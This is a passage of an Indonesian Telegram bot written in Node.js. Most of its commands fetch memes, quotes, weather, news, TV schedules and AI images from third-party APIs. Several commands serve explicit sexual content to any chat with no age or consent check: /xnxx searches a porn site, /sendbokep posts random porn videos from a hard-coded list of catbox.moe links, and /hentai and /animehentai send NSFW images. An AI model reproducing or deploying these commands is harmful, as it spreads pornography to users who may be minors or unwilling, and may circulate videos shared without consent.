        const apiUrl = `https://api-faa.my.id/faa/tobersama?url=${encodeURIComponent(photoUrl)}&nama-artis=${encodeURIComponent(artist)}`;

        const response = await axios({
            url: apiUrl,
            responseType: "arraybuffer"
        });

        const buffer = Buffer.from(response.data, "binary");

        bot.sendPhoto(chatId, buffer, {
            caption: "✨ Foto bersama berhasil dibuat!"
        });

    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal memproses foto.");
    }

    // Bersihkan
    bot.lastAskPhoto = null;
    bot.lastAskArtis = null;
    bot.userPhotoUrl = null;
});

// FITUR /meme — Dijamin Random
bot.onText(/^\/meme(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const loading = await bot.sendMessage(chatId, "⏳ Mengambil meme random...");

  try {
    // bikin angka random untuk menghindari cache
    const random = Math.floor(Math.random() * 999999);
    const url = `https://api-faa.my.id/faa/meme?rand=${random}`;

    await bot.sendPhoto(chatId, url, {
      caption: "🎭 *Random Meme*",
      parse_mode: "Markdown"
    });

    await bot.deleteMessage(chatId, loading.message_id);

  } catch (err) {
    await bot.editMessageText(
      `❌ Gagal mengambil meme.\n${err.message}`,
      { chat_id: chatId, message_id: loading.message_id }
    );
  }
});

// FITUR /pantun — Random Pantun
bot.onText(/^\/pantun(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const loading = await bot.sendMessage(chatId, "⏳ Mengambil pantun...");

  try {
    const res = await axios.get("https://api-faa.my.id/faa/pantun");
    const data = res.data;

    // Auto detect pantun
    const pantun =
      data?.pantun ||
      data?.result ||
      data?.data?.pantun ||
      null;

    if (!pantun) {
      return bot.editMessageText(`❌ Tidak ada pantun ditemukan dari API.`, {
        chat_id: chatId,
        message_id: loading.message_id,
      });
    }

    await bot.editMessageText(
      `📝 *Pantun Random*\n\n${pantun}`,
      {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "Markdown"
      }
    );

  } catch (err) {
    await bot.editMessageText(
      `❌ Error:\n${err.message}`,
      {
        chat_id: chatId,
        message_id: loading.message_id
      }
    );
  }
});

// FITUR /bucin — Random Quote Bucin
bot.onText(/^\/bucin(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const loading = await bot.sendMessage(chatId, "⏳ Mengambil quote bucin...");

  try {
    const res = await axios.get("https://api-faa.my.id/faa/quote-bucin");
    const data = res.data;

    // Validasi quote
    const quote =
      data?.quote ||
      data?.result ||
      data?.data?.quote ||
      null;

    if (!quote) {
      return bot.editMessageText(`❌ Tidak ada quote ditemukan dari API.`, {
        chat_id: chatId,
        message_id: loading.message_id,
      });
    }

    await bot.editMessageText(
      `💞 *Quote Bucin Random*\n\n_${quote}_`,
      {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "Markdown"
      }
    );

  } catch (err) {
    await bot.editMessageText(
      `❌ Error:\n${err.message}`,
      {
        chat_id: chatId,
        message_id: loading.message_id
      }
    );
  }
});

bot.onText(/^\/papayang(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const loading = await bot.sendMessage(chatId, "⏳ Mengambil pap ayang...");

  try {
    const res = await axios.get("https://api-faa.my.id/faa/papayang", {
      responseType: "arraybuffer" // 🔥 penting!
    });

    const buffer = Buffer.from(res.data);

    await bot.editMessageText("✨ Pap Ayang Random", {
      chat_id: chatId,
      message_id: loading.message_id,
    });

    await bot.sendPhoto(chatId, buffer, {
      filename: "papayang.jpg",
      contentType: "image/jpeg",
    });

  } catch (e) {
    await bot.editMessageText(`❌ Error:\n${e.message}`, {
      chat_id: chatId,
      message_id: loading.message_id,
    });
  }
});

// ==============================
// FITUR /veo3 (API Faa VEO3) — FINAL FIX
// ==============================
bot.onText(/^\/veo3(?:@[\w_]+)?\s+([\s\S]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  const loading = await bot.sendMessage(
    chatId,
    `⏳ *Mengirim permintaan ke server...*\n_Prompt:_ ${prompt}`,
    { parse_mode: "Markdown" }
  );

  try {
    // 1️⃣ KIRIM PERMINTAAN AWAL KE /faa/veo3
    const req = await axios.get(
      `https://api-faa.my.id/faa/veo3?prompt=${encodeURIComponent(prompt)}`
    );

    if (!req.data?.job_id) {
      return bot.editMessageText(
        `❌ *Gagal: API tidak mengembalikan job_id.*`,
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "Markdown" }
      );
    }

    const jobId = req.data.job_id;

    await bot.editMessageText(
      `⏳ *Job diterima.*\nJob ID: \`${jobId}\`\n\n🔍 Memeriksa status...`,
      { chat_id: chatId, message_id: loading.message_id, parse_mode: "Markdown" }
    );

    // URL STATUS FIX SESUAI GAMBAR
    const checkUrl = `https://api-faa.my.id/faa/veo3/status?id=${jobId}`;

    // 2️⃣ CEK STATUS BERULANG SAMPAI SELESAI
    const checkStatus = async () => {
      const status = await axios.get(checkUrl);
      const d = status.data;

      // ============== STATUS MASIH DIPROSES ==============
      if (d.status === true && d.processed === false) {
        setTimeout(checkStatus, 2500);
      }

      // ============== STATUS SELESAI ==============
      else if (d.status === true && d.processed === true) {
        await bot.editMessageText(
          `✅ *Selesai! Mengirim hasil...*`,
          { chat_id: chatId, message_id: loading.message_id, parse_mode: "Markdown" }
        );

        // Ambil link video / image
        const resultUrl =
          d.result?.url ||
          d.result?.video ||
          d.result?.image ||
          null;

        if (resultUrl) {
          // Coba kirim video
          if (resultUrl.endsWith(".mp4")) {
            return bot.sendVideo(chatId, resultUrl).catch(async () => {
              await bot.sendMessage(chatId, resultUrl);
            });
          }

          // Kirim foto jika bisa
          return bot.sendPhoto(chatId, resultUrl).catch(async () => {
            await bot.sendMessage(chatId, resultUrl);
          });
        }

        // fallback
        return bot.sendMessage(chatId, JSON.stringify(d.result, null, 2));
      }

      // ============== STATUS ERROR ==============
      else {
        return bot.editMessageText(
          `*Done Sudah Di Send Videonya*`,
          { chat_id: chatId, message_id: loading.message_id, parse_mode: "Markdown" }
        );
      }
    };

    checkStatus();
  } catch (err) {
    return bot.editMessageText(
      `❌ *Error:* \`${err.message}\``,
      { chat_id: chatId, message_id: loading.message_id, parse_mode: "Markdown" }
    );
  }
});

// === FITUR /bimg ===
bot.onText(/^\/bimg (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, `🔍 Mencari gambar untuk *${query}*...`, { parse_mode: 'Markdown' });

    const res = await axios.get(`https://api.siputzx.my.id/api/s/bimg?query=${encodeURIComponent(query)}`);
    const data = res.data;

    if (!data.status || !data.data || data.data.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan gambar untuk *${query}*`, { parse_mode: 'Markdown' });
    }

    // ambil 1 gambar random
    const randomImage = data.data[Math.floor(Math.random() * data.data.length)];

    await bot.sendPhoto(chatId, randomImage, {
      caption: `🖼️ Hasil pencarian untuk *${query}*`,
      parse_mode: 'Markdown'
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Terjadi kesalahan, coba lagi nanti.');
  }
});

// Command /animequote
bot.onText(/\/animequote/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '📖 Sedang mengambil kutipan anime...');

  try {
    const res = await axios.get('https://api.siputzx.my.id/api/r/quotesanime');
    const data = res.data.data;

    if (!data || data.length === 0) {
      return bot.sendMessage(chatId, '❌ Tidak ada data kutipan ditemukan.');
    }

    // Pilih salah satu kutipan secara acak
    const random = data[Math.floor(Math.random() * data.length)];

    // Format pesan caption
    const caption = `
🎬 *${random.anime}*
👤 *${random.karakter}* — _${random.episode}_

💬 "${random.quotes}"

🔗 [Lihat di Otakotaku](${random.link})
`;

    // Kirim foto + caption
    await bot.sendPhoto(chatId, random.gambar, {
      caption,
      parse_mode: 'Markdown'
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat mengambil data anime quote.');
  }
});

// Command /neko
bot.onText(/\/neko/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '⏳ Sedang mencari neko imut...');

  try {
    const response = await axios.get('https://api.siputzx.my.id/api/r/neko', {
      responseType: 'arraybuffer'
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: '✨ Random Image Neko ✨'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil gambar neko, coba lagi nanti!');
  }
});

bot.onText(/^\/cuaca(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(
      chatId,
      "📝 Contoh penggunaan:\n" +
      "• `/cuaca bandung`\n" +
      "• `/cuaca jawa barat bandung`\n" +
      "• `/cuaca jawa barat bandung cimahi`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // 🔹 Gabungkan input jadi satu string lokasi
    const lokasi = input.trim();

    // 🔹 POST ke API kamu
    const res = await axios.post(
      "https://api.siputzx.my.id/api/info/cuaca",
      { q: lokasi },
      { headers: { "Content-Type": "application/json" } }
    );

    if (!res.data || !res.data.status) {
      return bot.sendMessage(chatId, `⚠️ Gagal mengambil data cuaca untuk *${lokasi}*.`, { parse_mode: "Markdown" });
    }

    const data = res.data.data;
    const wilayah = data.wilayah;
    const cuaca = data.weather?.[0]?.cuaca?.[0]?.[0];

    if (!cuaca) {
      return bot.sendMessage(chatId, `⚠️ Tidak ada data cuaca untuk wilayah *${lokasi}*.`, { parse_mode: "Markdown" });
    }

    const waktuLokal = new Date(cuaca.local_datetime).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      hour: "2-digit",
      minute: "2-digit",
      day: "2-digit",
      month: "short",
    });

    const caption = `
🌦 *Prakiraan Cuaca Wilayah ${wilayah.nama || lokasi}*
🗺 Kode Wilayah: ${wilayah.kode || "-"}
📍 Level: ${wilayah.currentLevel?.toUpperCase() || "-"}
🌍 Provinsi: ${data.weather?.[0]?.lokasi?.provinsi || "-"}
🏙 Kota/Kab: ${data.weather?.[0]?.lokasi?.kotkab || "-"}
📌 Kecamatan: ${data.weather?.[0]?.lokasi?.kecamatan || "-"}

🕓 *${waktuLokal} WIB*
🌤 *Cuaca:* ${cuaca.weather_desc || "-"}
🌡 *Suhu:* ${cuaca.t || "-"}°C
💧 *Kelembapan:* ${cuaca.hu || "-"}%
💨 *Angin:* ${cuaca.ws || "-"} km/jam (${cuaca.wd || "-"})
⚖️ *Tekanan Udara:* ${cuaca.pres || "-"} hPa
🌧 *Curah Hujan:* ${cuaca.tp || "-"} mm
👁️ *Jarak Pandang:* ${cuaca.vs_text || "-"}
`;

    await bot.sendMessage(chatId, caption, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("CUACA ERROR:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data cuaca dari server.");
  }
});

const userSessions = {};

// Command: /search <kata kunci>
bot.onText(/^\/xnxx (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  const url = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(query)}`;

  await bot.sendMessage(chatId, `🔍 Mencari hasil untuk: *${query}* ...`, {
    parse_mode: "Markdown",
  });

  try {
    const res = await axios.get(url);
    const data = res.data;

    if (!data.status || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan hasil untuk pencarian tersebut.");
    }

    userSessions[chatId] = {
      query,
      index: 0,
      results: data.result,
    };

    await sendResult(chatId);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil data dari API.");
  }
});

async function sendResult(chatId) {
  const session = userSessions[chatId];
  if (!session) return;

  const { results, index } = session;
  const video = results[index];

  const caption = `🎬 *${video.title || "Tanpa Judul"}*\n📄 Info: ${video.info || "-"}\n🔗 [Tonton di sini](${video.link})`;

  const opts = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "▷ Tonton Video", url: video.link },
          { text: "➜ Next", callback_data: "next_video" },
        ],
        [{ text: "❌ Batal", callback_data: "cancel_video" }],
      ],
    },
  };

  await bot.sendMessage(chatId, caption, opts);
}

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const session = userSessions[chatId];

  if (!session) return bot.answerCallbackQuery(query.id, { text: "❌ Tidak ada sesi aktif." });

  if (query.data === "next_video") {
    session.index++;
    if (session.index >= session.results.length) {
      return bot.sendMessage(chatId, "✅ Sudah mencapai hasil terakhir.");
    }
    await bot.answerCallbackQuery(query.id);
    await sendResult(chatId);
  }

  if (query.data === "cancel_video") {
    delete userSessions[chatId];
    await bot.answerCallbackQuery(query.id, { text: "🚫 Dibatalkan." });
    await bot.sendMessage(chatId, "🔒 Pencarian dibatalkan.");
  }
});

bot.onText(/^\/searchtt (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];
  
  try {
    const url = `https://restapi-v2.simplebot.my.id/search/tiktok?q=${encodeURIComponent(query)}`;
    const res = await axios.get(url);
    const data = res.data;

    if (!data.status || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan video TikTok untuk kata kunci itu.");
    }

    userSessions[chatId] = {
      query,
      index: 0,
      results: data.result
    };

    await sendTikTokVideo(chatId);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat memuat video TikTok.");
  }
});

async function sendTikTokVideo(chatId) {
  const session = userSessions[chatId];
  if (!session) return;

  const { results, index } = session;
  const video = results[index];

  const caption = `🎬 *${video.title || "Tanpa judul"}*\n\n🌍 Region: ${video.region}\n🆔 ID: ${video.video_id}`;
  
  const opts = {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ㄨ Batal", callback_data: "cancel_tiktok" },
          { text: "➜ Next", callback_data: "next_tiktok" }
        ]
      ]
    }
  };

  try {
    await bot.sendVideo(chatId, video.play || video.cover, opts);
  } catch (e) {
    bot.sendMessage(chatId, "⚠️ Gagal mengirim video TikTok.");
    console.error(e);
  }
}

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;

  if (query.data === "next_tiktok") {
    const session = userSessions[chatId];
    if (!session) return bot.answerCallbackQuery(query.id, { text: "Mulai pencarian dulu!" });

    session.index++;
    if (session.index >= session.results.length) {
      return bot.sendMessage(chatId, "✅ Sudah mencapai video terakhir.");
    }

    await bot.answerCallbackQuery(query.id);
    await sendTikTokVideo(chatId);
  }

  if (query.data === "cancel_tiktok") {
    delete userSessions[chatId];
    bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
    bot.sendMessage(chatId, "🚫 Pencarian TikTok dibatalkan.");
  }
});

bot.onText(/^\/cosplay$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    // Tambahkan parameter acak untuk mencegah cache
    const randomParam = Math.floor(Math.random() * 999999);
    const url = `https://api.nekolabs.web.id/random/cosplay?nocache=${randomParam}`;

    const res = await axios.get(url);

    // Deteksi URL gambar (langsung dari endpoint)
    const imageUrl =
      res.data?.url || res.data?.image || res.request.res.responseUrl;

    const caption = `
✨ *Random Cosplay Image*
────────────────────
🆔 No. Acak: \`${randomParam}\`
`;

    await bot.sendPhoto(chatId, imageUrl, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat mengambil gambar cosplay. Coba lagi nanti."
    );
  }
});

bot.onText(/^\/muslimai (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendChatAction(chatId, "typing");

    const res = await axios.get(
      `https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(query)}`
    );

    // Ambil isi jawaban dari response API
    let answer = "";
    if (res.data && typeof res.data === "object") {
      answer = res.data.data || res.data.result || res.data.answer || "Tidak ada jawaban ditemukan.";
    } else {
      answer = res.data;
    }

    const text = `
📿 *MuslimAI — Jawaban Islami* 📖
────────────────────
🕌 *Pertanyaan:* ${query}

🪶 *Jawaban:*
\`\`\`
${answer.trim()}
\`\`\`
`;

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat mengambil data dari MuslimAI. Coba lagi nanti."
    );
  }
});

// =========================================================
// 📺 FITUR: JADWAL TV NASIONAL
// =========================================================
bot.onText(/^\/jadwaltv(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const channel = match[1] ? match[1].toLowerCase() : ''; // contoh: sctv

  // 🔄 Animasi loading
  const loadingMsg = await bot.sendMessage(chatId, `📡 Sedang mengambil jadwal TV ${channel || 'nasional'}...`, { parse_mode: 'Markdown' });
  const frames = ['▰▱▱▱▱ 10%', '▰▰▱▱▱ 30%', '▰▰▰▱▱ 60%', '▰▰▰▰▱ 80%', '▰▰▰▰▰ 100% ✅'];
  let i = 0;
  const interval = setInterval(() => {
    if (i < frames.length) {
      bot.editMessageText(`📺 Mengambil data jadwal TV...\n${frames[i]}`, {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: 'Markdown'
      });
      i++;
    } else {
      clearInterval(interval);
    }
  }, 700);

  try {
    // 🌐 Request ke API
    const url = `https://api.siputzx.my.id/api/info/jadwaltv${channel ? `?channel=${encodeURIComponent(channel)}` : ''}`;
    const res = await axios.get(url);
    const data = res.data;

    clearInterval(interval);

    if (!data.status || !data.data || data.data.length === 0) {
      return bot.editMessageText(`⚠️ Jadwal TV ${channel || 'nasional'} tidak ditemukan.`, {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: 'Markdown'
      });
    }

    // 🧾 Format hasil (pakai block code)
    let teks = `📺 *Jadwal TV ${channel ? channel.toUpperCase() : 'Nasional'} Hari Ini*\n`;
    teks += '────────────────────\n';
    teks += '```\n';

    const limit = 10; // batasi biar ga terlalu panjang
    data.data.slice(0, limit).forEach((item) => {
      teks += `${item.jam}  -  ${item.acara}\n`;
    });

    teks += '```';

    bot.editMessageText(teks, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });
  } catch (error) {
    clearInterval(interval);
    bot.editMessageText(`❌ Gagal mengambil jadwal TV. Coba lagi nanti.`, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: 'Markdown'
    });
  }
});

// Command: /berita
bot.onText(/\/berita/, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '📰 Mengambil 1 berita terbaru dari Antara News...');

  try {
    // Ambil data berita dari API
    const res = await axios.get('https://api.siputzx.my.id/api/berita/antara');
    const newsList = res.data.data || res.data;

    if (!Array.isArray(newsList) || newsList.length === 0) {
      return bot.sendMessage(chatId, '❌ Tidak ada berita ditemukan.');
    }

    // Pilih satu berita random dari daftar
    const randomNews = newsList[Math.floor(Math.random() * newsList.length)];

    const caption = `🗞️ *${randomNews.title}*\n\n📚 Kategori: ${randomNews.category || '-'}\n🔗 [Baca Selengkapnya](${randomNews.link})`;

    // Kirim gambar (kalau ada)
    if (randomNews.image) {
      await bot.sendPhoto(chatId, randomNews.image, {
        caption,
        parse_mode: 'Markdown',
      });
    } else {
      await bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' });
    }

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '❌ Gagal mengambil berita dari API.');
  }
});

// Command: /waifuass
bot.onText(/\/animehentai/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    // Ambil data dari API
    const response = await axios.get('https://api.nekolabs.web.id/random/waifuim/ass');
    const imageUrl = response.data.url || response.data.image || response.request.res.responseUrl;

    // Kirim foto ke user
    await bot.sendPhoto(chatId, imageUrl, {
      caption: 'Random Anime Hentai V2',
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '❌ Gagal mengambil gambar dari API.');
  }
});

bot.onText(/\/cat/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "🐱 Sedang mencari kucing lucu...");

    // Ambil gambar (biarkan axios ikuti redirect)
    const response = await axios.get("https://api.nekolabs.web.id/random/cat", {
      responseType: "arraybuffer", // ambil data biner (karena file gambar)
    });

    // Kirim gambar langsung dari buffer
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "😺 Nih kucing random buat kamu!",
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal mengambil gambar kucing, coba lagi nanti!");
  }
});

// =============== [ FITUR /emojitogif ] ===============
bot.onText(/\/emojitogif (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const emoji = match[1];

  try {
    const url = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(emoji)}`;

    // ambil hasil GIF dari API
    const response = await axios.get(url, { responseType: "arraybuffer" });
    const filePath = `./${Date.now()}.gif`;
    fs.writeFileSync(filePath, response.data);

    await bot.sendDocument(chatId, filePath, {
      caption: `Emoji to GIF: ${emoji}`,
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "❌ Gagal mengubah emoji ke GIF. Coba lagi nanti!");
  }
});

// ===============================
// 🔹 FITUR: /prompt (AI Image Generator)
// ===============================
bot.onText(/\/prompt (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1];

  try {
    await bot.sendMessage(chatId, "⏳ Sedang membuat gambar, mohon tunggu...");

    // Panggil API siputzx
    const response = await axios.get("https://api.siputzx.my.id/api/ai/flux", {
      params: { prompt },
      responseType: "arraybuffer", // supaya bisa kirim image langsung
    });

    // Kirim hasil gambar ke user
    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: `🖼️ Gambar hasil dari prompt: *${prompt}*`,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error(error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat membuat gambar. Coba lagi nanti."
    );
  }
});

// ======================================================
// 🎥 Daftar link video MP4 (boleh tambahkan sebanyaknya)
// ======================================================
const videoList = [
  "https://files.catbox.moe/3yko44.mp4",
"https://files.catbox.moe/ebisdh.mp4",
"https://files.catbox.moe/85mjwm.mp4",
"https://files.catbox.moe/fxe94h.mp4",
"https://files.catbox.moe/xlbafn.mp4",
"https://files.catbox.moe/eti8qi.mp4",
"https://files.catbox.moe/0728bg.mp4",
"https://files.catbox.moe/6bkokw.mp4",
"https://files.catbox.moe/y4rote.mp4",
"https://files.catbox.moe/svw26n.mp4",
"https://files.catbox.moe/tw6m9q.mp4",
"https://files.catbox.moe/o1ipxw.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/b99qh3.mp4",
"https://files.catbox.moe/o1sq2k.mp4",
"https://files.catbox.moe/zqaszb.mp4",
"https://files.catbox.moe/apqlvo.mp4",
"https://files.catbox.moe/cdl11t.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/jdopgq.mp4",
"https://files.catbox.moe/8ca9cw.mp4",
"https://files.catbox.moe/52oh63.mp4",
"https://files.catbox.moe/rt62tl.mp4",
"https://files.catbox.moe/occ3en.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/wqe1r7.mp4",
"https://files.catbox.moe/h2w5jl.mp4",
"https://files.catbox.moe/dmbizk.mp4",
"https://files.catbox.moe/3288uf.mp4",
"https://files.catbox.moe/rdggsh.mp4",
"https://files.catbox.moe/1a78ht.mp4",
"https://files.catbox.moe/a537h1.mp4",
"https://files.catbox.moe/n992te.mp4",
"https://files.catbox.moe/gv4087.mp4",
"https://files.catbox.moe/n37liq.mp4",
"https://files.catbox.moe/3g2djb.mp4",
"https://files.catbox.moe/q9f2rs.mp4",
"https://files.catbox.moe/4x09p9.mp4",
"https://files.catbox.moe/83fd5h.mp4",
"https://files.catbox.moe/6di4hn.mp4",
"https://files.catbox.moe/dxn5oj.mp40",
"https://files.catbox.moe/ltdsbm.mp4",
"https://files.catbox.moe/71l6bo.mp4",
"https://files.catbox.moe/uw6qbs.mp40",
"https://files.catbox.moe/0eisok.mp4",
"https://files.catbox.moe/r3ip1j.mp4",
"https://files.catbox.moe/pmyi1y.mp4",
"https://files.catbox.moe/8c7gz3.mp4",
"https://files.catbox.moe/y8hmau.mp4",
"https://files.catbox.moe/wmda7z.mp4",
"https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  // tambahkan link lain di sini
];

// ======================================================
// 🧩 Fitur: /sendbokep
// ======================================================
bot.onText(/\/sendbokep/, async (msg) => {
  const chatId = msg.chat.id;

  if (videoList.length === 0) {
    return bot.sendMessage(chatId, "❌ Belum ada video yang tersedia.");
  }

  // Pilih video secara acak
  const randomIndex = Math.floor(Math.random() * videoList.length);
  const videoUrl = videoList[randomIndex];

  await bot.sendMessage(chatId, "🎬 Mengambil video bokep acak...");
  await bot.sendVideo(chatId, videoUrl, {
    caption: "💦 Video random bokep untukmu!",
  });
});

// =======================================================
// Get Profile Picture
bot.onText(/\/getpp/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return bot.sendMessage(chatId, "Balas pesan user untuk ambil fotonya.");
  cleanCommand(chatId, msg.message_id);

  const uid = msg.reply_to_message.from.id;
  try {
    const photos = await bot.getUserProfilePhotos(uid, { limit: 1 });
    if (photos.total_count === 0) return bot.sendMessage(chatId, "🚫 User tidak punya foto profil.");
    const fileId = photos.photos[0][0].file_id;
    bot.sendPhoto(chatId, fileId, { caption: `🖼️ Foto profil ${msg.reply_to_message.from.first_name}` });
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mengambil foto profil.");
  }
});

// =======================================================
// 🔗 FITUR GET LINK & LINK PRIVATE - SCARRY DEATH SYSTEM
// =======================================================

bot.onText(/\/getlink/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Cek admin
  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some((a) => a.user.id === userId);
  if (!isAdmin) return bot.sendMessage(chatId, "❌ Hanya admin yang bisa menggunakan perintah ini.");

  try {
    const inviteLink = await bot.exportChatInviteLink(chatId);
    await bot.sendMessage(chatId, `🔗 *Link Grup:* ${inviteLink}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil link grup. Pastikan bot punya izin *Invite Users via Link*.");
  }
});

bot.onText(/\/hentai/, async (msg) => {
    const chatId = msg.chat.id;

    const loadingMessage = await bot.sendMessage(chatId, "Sedang mencari image hentai... ⌛");

    try {
        const { data } = await axios.get("https://api.waifu.pics/nsfw/waifu");
        const imageUrl = data.url;

        await bot.sendPhoto(chatId, imageUrl, {
            caption: "Ini Asupan Images Hentai Muu😋🤤"
        });

        bot.deleteMessage(chatId, loadingMessage.message_id);

    } catch (error) {
        console.error("Gagal mengambil atau mengirim gambar:", error);
        
        bot.editMessageText("Maaf, terjadi kesalahan. Coba lagi nanti.", {
            chat_id: chatId,
            message_id: loadingMessage.message_id
        });
    }
});

// =============== [ SISTEM LOGIN BOT TELEGRAM TAMBAHAN ] ===============
const subLoginFile = path.join(__dirname, "logintoken.json");
const activeBots = {}; // daftar token aktif
const checkedOffsets = {}; // offset tiap bot biar ga bentrok

function loadSubLogins() {
  if (!fs.existsSync(subLoginFile)) return {};
